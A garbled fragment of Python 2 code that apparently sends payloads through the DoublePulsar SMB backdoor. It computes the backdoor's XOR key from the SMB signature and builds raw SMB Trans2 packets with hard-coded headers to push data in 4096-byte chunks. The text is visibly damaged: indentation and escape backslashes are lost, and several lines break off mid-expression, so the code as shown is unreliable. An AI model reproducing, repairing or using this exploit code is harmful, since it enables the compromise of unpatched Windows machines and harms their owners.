    connections.append({"socket":sock,"stream" : i[1]})
    if i[0] == "close":
    [j['socket'].close() for j in connections if j["stream"] == i[1]]
    if i[0] == "send":
    [j['socket'].send(i[2]) for j in connections if j["stream"] == i[1]]
    if i[0] == "recv":
    [j['socket'].recv(2048) for j in connections if j['stream'] == i[1]]
    def calculate_doublepulsar_xor_key(s):
    """Calaculate Doublepulsar Xor Key
    """
    x = (2 * s ^ (((s & 0xff00 | (s > 16) | s & 0xff0000) >> 8)))
    x = x & 0xffffffff  # this line was added just to truncate to 32 bits
    return x
    def make_unicode_host(org_host):
    host_len = len(org_host)
    new_host = ""
    for i in range(host_len):
    new_host =new_host + "x00" + org_host[i]
    return new_host
    def get_smb_signature(smb_data):
    return smb_data[18:22]
    def get_key(smb_data):
    smb_sign = struct.unpack(" 0:
    ncount += 1
    make_data =""
    for i in range(ncount):
    if i H",4096 +32 +34 + 12)
    #print binascii.b2a_hex(smb_Length)
    totalDataCount = struct.pack("H",data_len - 4096*i +32 +34 + 12)
    totalDataCount = struct.pack("<H",data_len - 4096*i)
    byteCount = struct.pack("<H",data_len - 4096*i+ 13)
    make_data = send_data[i*4096:]
    netBIOS_header = "x00x00"+ smb_Length
    smb_header = "xFFx53x4Dx42x32x00x00x00x00x18x07xC0x00x00x00x00x00x00x00x00x00x00x00x00x00x08xFFxFEx00x08x42x00"
    transRequest_header = "x0Fx0Cx00"+ totalDataCount +"x01x00x00x00x00x00x00x00xE5x69x7Ax00x00x00x0Cx00x42x00"+totalDataCount+"x4Ex00x01x00x0Ex00"+ byteCount +"x00"
    data_header = "x08x27x00x00"+totalDataCount+"x00x00x00"+chr(i*0x10)+"x00x00"
    print "data_header:",binascii.b2a_hex(data_header)
    print len(data_header)